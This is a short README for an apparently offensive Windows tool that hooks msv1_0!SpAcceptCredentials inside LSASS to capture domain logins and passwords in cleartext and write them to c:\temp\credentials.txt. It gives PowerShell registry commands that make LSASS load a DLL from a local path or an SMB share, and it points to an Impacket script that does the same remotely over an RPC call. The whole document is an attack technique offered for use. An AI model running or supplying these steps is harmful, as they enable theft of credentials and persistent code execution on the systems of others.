# LogonCredentialsSteal

LOCAL AND REMOTE HOOK msv1_0!SpAcceptCredentials from LSASS.exe and DUMP DOMAIN/LOGIN/PASSWORD IN CLEARTEXT to text file.

run powershell v1.0

New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value "c:\temp\lsass_lib.dll"
New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value "\\share\lulz\lsass_lib.dll"

or

To load our DLL, we can use a very simple Impacket Python script to modify the registry and 
add a key to HKLM\SYSTEM\CurrentControlSet\Services\NTDS\DirectoryServiceExtPt pointing to our DLL 
hosted on an open SMB share, and then trigger the loading of the DLL using a call to hSamConnect RPC call. 
look in remote_inject.py


will inject lib and dump any logon credentials to c:\temp\credentials.txt



thanks https://ired.team/ for research
